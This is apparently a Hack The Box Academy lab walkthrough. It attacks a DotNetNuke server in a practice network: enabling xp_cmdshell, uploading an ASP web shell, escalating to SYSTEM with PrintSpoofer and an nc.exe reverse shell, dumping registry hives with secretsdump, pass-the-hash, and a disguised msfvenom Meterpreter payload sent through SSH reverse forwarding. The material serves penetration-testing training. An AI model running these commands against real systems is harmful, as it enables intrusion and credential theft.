# Exploitation & Privilege Escalation

---

At this point, we have moved from the `Information Gathering` and `Vulnerability Assessment` stages into the `Exploitation` stage of the Penetration Testing Process. After obtaining a foothold, we enumerated what hosts were available to us, scanned for open ports, and probed the accessible services.

---

## Attacking DNN

Let's head over to DNN and try our luck with the credential pair `Administrator:D0tn31Nuk3R0ck$$@123`. This is a success; we are logged in as the SuperUser administrator account. Here we would want to record another two high-risk findings: `Insecure File Shares` and `Sensitive Data on File Shares`. We could potentially combine these into one, but it's worth highlighting as separate issues because if the client restricts anonymous access, but all Domain Users can still access the share and see data that is not necessary for their day-to-day work, then there is a still a risk present.

![text](https://academy.hackthebox.com/storage/modules/163/dnn_logged_in.png)

A SQL console is accessible under the `Settings` page where we can enable `xp_cmdshell` and run operating system commands. We can first enable this by pasting these lines into the console one by one and clicking `Run Script`. We won't get any output from each command, but no errors typically means it's working.

Exploitation & Privilege Escalation

```shell-session
EXEC sp_configure 'show advanced options', '1'
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', '1' 
RECONFIGURE
```

If this works, we can run operating system commands in the format `xp_cmdshell '<command here>'`. We could then use this to obtain a reverse shell or work on privilege escalation.

![text](https://academy.hackthebox.com/storage/modules/163/sql_commands.png)

What's also interesting about DNN is we can [change the allowable file extensions](https://dnnsupport.dnnsoftware.com/hc/en-us/articles/360004928653-Allowable-File-Types-and-Extensions-for-Upload) to allow `.asp` and `.aspx` files to be uploaded. This is useful if we cannot gain RCE via the SQL console. If this is successful, we can upload an ASP web shell and gain remote code execution on the `DEV01` server. The allowed file extensions list can be modified to include .asp and .aspx by browsing to `Settings -> Security -> More -> More Security Settings` and adding them under `Allowable File Extensions`, and clicking the `Save` button. Once this is done, we can upload an [ASP webshell](https://raw.githubusercontent.com/backdoorhub/shell-backdoor-list/master/shell/asp/newaspcmd.asp) after browsing to `http://172.16.8.20/admin/file-management`. Click the upload files button and select the ASP web shell we downloaded to our attack host.

Once uploaded, we can right-click on the uploaded file and select `Get URL`. The resultant URL will allow us to run commands via the web shell, where we could then work to get a reverse shell or perform privilege escalation steps, as we'll see next.

![text](https://academy.hackthebox.com/storage/modules/163/asp_webshell.png)

---

## Privilege Escalation

Next, we need to escalate privileges. In the command output above, we saw that we have `SeImpersonate` privileges. Following the steps in the [SeImpersonate and SeAssignPrimaryToken](https://academy.hackthebox.com/module/67/section/607) section in the `Windows Privilege Escalation` module, we can work to escalate our privileges to SYSTEM, which will result in an initial foothold in the Active Directory (AD) domain and allow us to begin enumerating AD.

We'll try escalating privileges using the `PrintSpoofer` tool and then see if we can dump any useful credentials from the host's memory or registry. We'll need nc.exe on the DEV01 host to send ourselves a shell and the PrintSpoofer64.exe binary to leverage `SeImpersonate` privileges. There are a few ways we can transfer them up there. We could use the `dmz01` host as a "jump host" and transfer our tools through it via SCP and then start a Python3 web server and download them onto the DEV01 host using `certutil`.

An easier way would be to modify the DNN `Allowable File Extensions` once again to allow the `.exe` file format. We can then upload both of these files and confirm via our shell that they are located in `c:\DotNetNuke\Portals\0`.

Once uploaded, we can start a `Netcat` listener on the `dmz01` host and run the following command to obtain a reverse shell as `NT AUTHORITY\SYSTEM`:

Exploitation & Privilege Escalation

```shell-session
c:\DotNetNuke\Portals\0\PrintSpoofer64.exe -c "c:\DotNetNuke\Portals\0\nc.exe 172.16.8.120 443 -e cmd"
```

We execute the command and get a reverse shell almost instantly.

Exploitation & Privilege Escalation

```shell-session
root@dmz01:/tmp# nc -lnvp 443

Listening on 0.0.0.0 443
Connection received on 172.16.8.20 58480
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>hostname
hostname
ACADEMY-AEN-DEV01
```

From here, we can perform some post-exploitation and manually retrieve the contents of the SAM database and with it, the local administrator password hash.

Exploitation & Privilege Escalation

```cmd-session
c:\DotNetNuke\Portals\0> reg save HKLM\SYSTEM SYSTEM.SAVE
reg save HKLM\SYSTEM SYSTEM.SAVE

The operation completed successfully.

c:\DotNetNuke\Portals\0> reg save HKLM\SECURITY SECURITY.SAVE
reg save HKLM\SECURITY SECURITY.SAVE

The operation completed successfully.

c:\DotNetNuke\Portals\0> reg save HKLM\SAM SAM.SAVE
reg save HKLM\SAM SAM.SAVE

The operation completed successfully.
```

Now we can once again modify the allowed file extensions to permit us to down the `.SAVE` files. Next, we can go back to the `File Management` page and download each of the three files to our attack host.

![text](https://academy.hackthebox.com/storage/modules/163/download_sam.png)

Finally, we can use `secretsdump` to dump the SAM database and retrieve a set of credentials from LSA secrets.

Exploitation & Privilege Escalation

```shell-session
swmpdnky@htb[/htb]$ secretsdump.py LOCAL -system SYSTEM.SAVE -sam SAM.SAVE -security SECURITY.SAVE

Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0xb3a720652a6fca7e31c1659e3d619944
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<redacted>:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
mpalledorous:1001:aad3b435b51404eeaad3b435b51404ee:3bb874a52ce7b0d64ee2a82bbf3fe1cc:::
[*] Dumping cached domain logon information (domain/username:hash)
INLANEFREIGHT.LOCAL/hporter:$DCC2$10240#hporter#f7d7bba128ca183106b8a3b3de5924bc
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:3e002600200046005a003000460021004b00460071002e002b004d0042005000480045002e006c00280078007900580044003b0050006100790033006e002a0047004100590020006e002d00390059003b0035003e0077005d005f004b004900400051004e0062005700440074006b005e0075004000490061005d006000610063002400660033003c0061002b0060003900330060006a00620056006e003e00210076004a002100340049003b00210024005d004d006700210051004b002e004f007200290027004c00720030005600760027004f0055003b005500640061004a006900750032006800540033006c00
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:cb8a6327fc3dad4ea7c84b88c7542e7c
[*] DefaultPassword 
(Unknown User):Gr8hambino!
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x6968d50f5ec2bc41bc207a35f0392b72bb083c22
dpapi_userkey:0xe1e7a8bc8273395552ae8e23529ad8740d82ea92
[*] NL$KM 
 0000   21 0C E6 AC 8B 08 9B 39  97 EA D9 C6 77 DB 10 E6   !......9....w...
 0010   2E B2 53 43 7E B8 06 64  B3 EB 89 B1 DA D1 22 C7   ..SC~..d......".
 0020   11 83 FA 35 DB 57 3E B0  9D 84 59 41 90 18 7A 8D   ...5.W>...YA..z.
 0030   ED C9 1C 26 FF B7 DA 6F  02 C9 2E 18 9D CA 08 2D   ...&...o.......-
NL$KM:210ce6ac8b089b3997ead9c677db10e62eb253437eb80664b3eb89b1dad122c71183fa35db573eb09d84594190187a8dedc91c26ffb7da6f02c92e189dca082d
[*] Cleaning up... 
```

We confirm that these credentials work using `CrackMapExec` and we now have a way back to this system should we lose our reverse shell.

Exploitation & Privilege Escalation

```shell-session
swmpdnky@htb[/htb]$ proxychains crackmapexec smb 172.16.8.20 --local-auth -u administrator -H <redacted>

ProxyChains-3.1 (http://proxychains.sf.net)
[*] Initializing LDAP protocol database
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.20:445-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.20:445-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.20:135-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.20:445-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.20:445-<><>-OK
SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-AEN-DEV) (domain:ACADEMY-AEN-DEV) (signing:False) (SMBv1:False)
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.20:445-<><>-OK
SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [+] ACADEMY-AEN-DEV\administrator <redacted> (Pwn3d!)
```

From the `secretsdump` output above, we notice a cleartext password, but it's not immediately apparent which user it's for. We could dump LSA again using `CrackMapExec` and confirm that the password is for the `hporter` user.

We now have our first set of domain credentials for the INLANEFREIGHT.LOCAL domain, `hporter:Gr8hambino!`. We can confirm this from our reverse shell on `dmz01`.

Exploitation & Privilege Escalation

```cmd-session
c:\DotNetNuke\Portals\0> net user hporter /dom
net user hporter /dom

The request will be processed at a domain controller for domain INLANEFREIGHT.LOCAL.

User name                    hporter
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            6/1/2022 11:32:05 AM
Password expires             Never
Password changeable          6/1/2022 11:32:05 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   6/21/2022 7:03:10 AM

Logon hours allowed          All

Local Group Memberships      
Global Group memberships     *Domain Users         
The command completed successfully.
```

We could also escalate privileges on the DEV01 host using the `PrintNightmare` vulnerability. There are also other ways to retrieve the credentials, such as using Mimikatz. Play around with this machine and apply the various skills you learned in the `Penetration Tester Path` to perform these steps in as many ways as possible to practice and find what works best for you.

At this point, we don't have any additional findings to write down because all we did was abuse built-in functionality, which we could perform because of the file share issues noted previously. We could note down `PrintNightmare` as a high-risk finding if we can exploit it.

---

## Alternate Method - Reverse Port Forwarding

There are many ways to attack this network and achieve the same results, so we will not cover them all here, but one worth mentioning is [Remote/Reverse Port Forwarding with SSH](https://academy.hackthebox.com/module/158/section/1427). Let's say we want to return a reverse shell from the `DEV01` box to our attack host. We can't do this directly since we're not in the same network, but we can leverage `dmz01` to perform reverse port forwarding and achieve our goal. We may want to get a Meterpreter shell on the target or a reverse shell directly for any number of reasons. We could have also performed all of these actions without ever getting a shell, as we could have used `PrintSpoofer` to add a local admin or dump credentials from `DEV01` and then connect to the host in any number of ways from our attack host using Proxychains (pass-the-hash, RDP, WinRM, etc.). See how many ways you can achieve the same task of interacting with the `DEV01` host directly from your attack host. It's essential to be versatile, and this lab network is a great place to practice as many techniques as possible and hone our skills.

Let's walk through the reverse port forwarding method quickly. First off, we need to generate a payload using `msfvenom`. Note that here we'll specify the IP address of the `dmz01` pivot host in the `lhost` field and NOT our attack host IP as the target would not be able to connect back to us directly.

Exploitation & Privilege Escalation

```shell-session
swmpdnky@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https lhost=172.16.8.120 -f exe -o teams.exe LPORT=443

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 787 bytes
Final size of exe file: 7168 bytes
Saved as: teams.exe
```

Next, we need to set up a `multi/handler` and start a listener on a different port than the payload we generated will use.

Exploitation & Privilege Escalation

```shell-session
[msf](Jobs:0 Agents:0) exploit(windows/smb/smb_delivery) >> use multi/handler
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lhost 0.0.0.0
lhost => 0.0.0.0
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lport 7000
lport => 7000
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run

[*] Started HTTPS reverse handler on https://0.0.0.0:7000
```

Next, we need to upload the `teams.exe` reverse shell payload to the `DEV01` target host. We can SCP it up to `dmz01`, start a Python web server on that host and then download the file. Alternatively, we can use the DNN file manager to upload the file as we did previously. With the payload on the target, we need to set up `SSH remote port forwarding` to forward the dmz01 pivot box port `443` to the Metasploit listener port `7000`. The `R` flag tells the pivot host to listen on port `443` and forward all incoming traffic to this port to our Metasploit listener at `0.0.0.0:7000` configured on our attack host.

Exploitation & Privilege Escalation

```shell-session
swmpdnky@htb[/htb]$ ssh -i dmz01_key -R 172.16.8.120:443:0.0.0.0:7000 root@10.129.203.111 -vN

OpenSSH_8.4p1 Debian-5, OpenSSL 1.1.1n  15 Mar 2022
debug1: Reading configuration data /etc/ssh/ssh_config
debug1: /etc/ssh/ssh_config line 19: include /etc/ssh/ssh_config.d/*.conf matched no files
debug1: /etc/ssh/ssh_config line 21: Applying options for *
debug1: Connecting to 10.129.203.111 [10.129.203.111] port 22.

<SNIP>

debug1: Authentication succeeded (publickey).
Authenticated to 10.129.203.111 ([10.129.203.111]:22).
debug1: Remote connections from 172.16.8.120:443 forwarded to local address 0.0.0.0:7000
debug1: Requesting no-more-sessions@openssh.com
debug1: Entering interactive session.
debug1: pledge: network
debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0
debug1: Remote: /root/.ssh/authorized_keys:1: key options: agent-forwarding port-forwarding pty user-rc x11-forwarding
debug1: Remote: /root/.ssh/authorized_keys:1: key options: agent-forwarding port-forwarding pty user-rc x11-forwarding
debug1: Remote: Forwarding listen address "172.16.8.120" overridden by server GatewayPorts
debug1: remote forward success for: listen 172.16.8.120:443, connect 0.0.0.0:7000
```

Next, execute the teams.exe payload from the `DEV01` host, and if all goes to plan, we'll get a connection back.

Exploitation & Privilege Escalation

```shell-session
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> exploit

[*] Started reverse TCP handler on 0.0.0.0:7000 
[*] Sending stage (175174 bytes) to 127.0.0.1
[*] Meterpreter session 2 opened (127.0.0.1:7000 -> 127.0.0.1:51146 ) at 2022-06-22 12:21:25 -0400

(Meterpreter 2)(c:\windows\system32\inetsrv) > getuid
Server username: IIS APPPOOL\DotNetNukeAppPool
```

A caveat to the above method is that, by default, OpenSSH only allows connection to remote forwarded ports from the server itself (localhost). To allow this, we must edit the `/etc/ssh/sshd_config` file on Ubuntu systems and change the line `GatewayPorts no` to `GatewayPorts yes`, otherwise we will not be able to get a call back on the port we forwarded in the SSH command (port 443 in our case). To do this, we would need root SSH access to the host we are using to pivot from. At times we will see this configuration set up like this, so it works straight away, but if we don't have root access to the host with the ability to temporarily modify the SSH config file (and reload it to take effect using `service sshd reload`), then we won't be able to perform port forwarding in this way. Keep in mind that this type of change opens up a security hole in the client's system, so you'd want to clear it with them, note down the change, and make every effort to revert it at the end of testing. This [post](https://www.ssh.com/academy/ssh/tunneling/example) is worth reading to understand SSH Remote Forwarding better.

---

## Off to a Good Start

Now that we've enumerated the internal network attacked our first host, escalated privileges, performed post-exploitation, and set up our pivots/multiple ways to assess the internal network, let's turn our attention to the AD environment. Given that we have a set of credentials, we can perform all sorts of enumeration to get a better lay of the land and look for pathways to Domain Admin.